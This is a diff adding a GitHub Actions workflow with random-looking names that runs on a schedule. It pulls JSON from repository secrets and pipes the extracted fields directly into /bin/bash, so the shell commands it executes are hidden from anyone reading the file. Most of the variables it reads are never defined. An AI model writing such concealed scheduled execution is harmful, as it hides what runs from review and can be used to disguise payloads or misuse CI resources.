@@ -1,0 +1,25 @@
+name: laolishi1829
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '18 5/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: laolishi1829
+        env:
+          lw2672: ${{ secrets.lw2672 }}
+        run: |
+          echo $lw2672 | jq -r .pyxk9 | /bin/bash
+          echo $deac8941 | jq -r .yodp4334 | /bin/bash
+          echo $py96604 | jq -r .cmz7 | /bin/bash
+          echo $bvhfh62099 | jq -r .dwh9286 | /bin/bash
+          echo $kiis159 | jq -r .lbt9520 | /bin/bash
+          echo $q355 | jq -r .bk078 | /bin/bash
+          echo $hu3 | jq -r .hjzzh3027 | /bin/bash
+          echo $okxs0 | jq -r .a8200 | /bin/bash
+          echo $k789 | jq -r .va34756 | /bin/bash
+
